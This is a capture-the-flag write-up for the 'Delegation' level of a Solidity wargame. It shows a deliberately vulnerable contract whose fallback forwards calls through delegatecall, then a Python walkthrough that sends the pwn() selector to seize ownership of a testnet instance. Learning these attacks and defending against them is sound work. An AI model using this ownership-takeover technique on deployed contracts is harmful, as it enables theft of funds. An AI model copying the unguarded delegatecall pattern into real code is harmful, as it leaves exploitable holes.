# 06 - Delegation

## Challenge

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## Summary

There are 2 contracts here:

- `Delegate` - a contract that has a `pwn` function that sets the `owner` to `msg.sender`. Our goal is to call this function.
- `Delegation` - a contract that has a `fallback` function that calls `delegatecall` on the `Delegate` contract. We only have access to this contract. 

As per hint, let's first check out the [Solidity documentation](https://docs.soliditylang.org/en/v0.8.20/introduction-to-smart-contracts.html#delegatecall-and-libraries) on `delegatecall`.

> There exists a special variant of a message call, named `delegatecall` which is identical to a message call apart from the fact that the code at the target address is executed in the context (i.e. at the address) of the calling contract and `msg.sender` and `msg.value` do not change their values.
>
> This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.

This means that the `Delegate` contract's code is executed in the context of the `Delegation` contract. From previous learnings, we already know that `fallback()` is invoked when a function is called on a contract that does not exist. In this case, we can call `pwn()` on the `Delegate` contract by invoking `fallback()` on the `Delegation` contract (use `send_transaction`). We need to send function signature of `pwn()` as `msg.data` so that code of `Delegate` is executed in the context of `Delegation`. This changes the ownership of `Delegation` to sender which is us.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0x61a228cec28588B7611535E3e92EE35Bc3Fe807F'
```

As explained, we get signature of `pwn()` and send this as data field when invoking `fallback()` on `Delegation` contract.

```py
>>> account.send_transaction(contract_addr, data=encode_with_signature("pwn()"), gas_limit=1000000)
2023-06-07 20:21:13.614 | INFO     | cheb3.account:send_transaction:103 - Transaction to 0x61a228cec28588B7611535E3e92EE35Bc3Fe807F: 0x54396f51c6a19c02ab7d505e556fd18b0ba1f788e40aa578398f951214dc75dd
AttributeDict({'blockHash': HexBytes('0x30d5fc1c74050b2441333733ac75badb18799879d17f296db1fe7282eb9127ad'), 'blockNumber': 9141647, 'contractAddress': None, 'cumulativeGasUsed': 20382073, 'effectiveGasPrice': 102, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 31204, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x61a228cec28588B7611535E3e92EE35Bc3Fe807F', 'transactionHash': HexBytes('0x54396f51c6a19c02ab7d505e556fd18b0ba1f788e40aa578398f951214dc75dd'), 'transactionIndex': 63, 'type': 0})
```

The above line calls `send_transaction` on `Delegation` contract, which invokes `fallback()` with `msg.data` being `pwn()`. 

Finally, submit the instance to pass the level.

## Afterword

> Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.